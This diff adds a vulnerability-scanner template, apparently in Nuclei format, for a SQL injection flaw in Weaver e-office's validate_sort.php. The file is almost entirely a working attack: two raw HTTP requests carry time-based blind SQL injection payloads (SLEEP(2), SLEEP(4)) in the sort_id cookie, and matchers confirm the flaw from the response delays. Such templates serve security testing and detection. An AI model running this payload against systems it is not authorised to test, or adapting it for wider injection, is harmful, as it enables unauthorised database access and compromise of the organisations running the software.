@@ -1,0 +1,31 @@
+id: WeaverE-validate_sort-sqli
+
+info:
+  name: 泛微e-office validate_sort.php 存在sql注入漏洞
+  author: WeaverE
+  severity: high
+  tags: WeaverE
+
+http:
+  - raw:
+      - |+
+        GET /general/officeitem/sort/validate_sort.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Cookie: sort_id=1 AND (SELECT 4110 FROM (SELECT(SLEEP(2)))Cfzo)
+
+      - |+
+        GET /general/officeitem/sort/validate_sort.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Cookie: sort_id=1 AND (SELECT 4110 FROM (SELECT(SLEEP(4)))Cfzo)
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=2 && duration_1<4'  
+          - 'duration_2>=4 && duration_2<6'
+        condition: and
+
